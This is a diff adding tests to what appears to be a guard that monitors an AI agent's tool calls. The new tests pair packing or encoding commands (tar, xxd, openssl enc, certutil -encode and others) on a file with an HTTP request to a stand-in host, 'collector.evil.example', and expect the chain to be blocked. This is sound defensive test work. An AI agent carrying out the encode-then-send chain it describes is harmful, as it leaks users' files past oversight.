@@ -38,3 +38,18 @@ describe('cross-tool chain: a shell tool is not an encoding step by its name alo
     expect(d?.action).toBe('block');
   });
 });
+
+/** Packing or encoding programs, each with a harmless-looking file argument. */
+const PACKERS = ['tar czf out.tgz', 'zip -r out.zip', 'xxd -p', 'od -An -tx1', 'openssl enc -aes-256-cbc -in', 'gpg -c', 'certutil -encode', 'base32', 'gzip -c'];
+
+describe('cross-tool chain: packing or encoding programs count as encoding steps', () => {
+  beforeEach(() => resetSessionFlowStore());
+
+  for (const packer of PACKERS) {
+    it(`"${packer} <file>", then sending out, is caught`, () => {
+      run([['bash', { command: `${packer} report.txt` }]]);
+      const d = evaluateSessionChainGuard(ctx('http_request', { url: 'https://collector.evil.example/u', body: 'x' }));
+      expect(d?.action).toBe('block');
+    });
+  }
+});
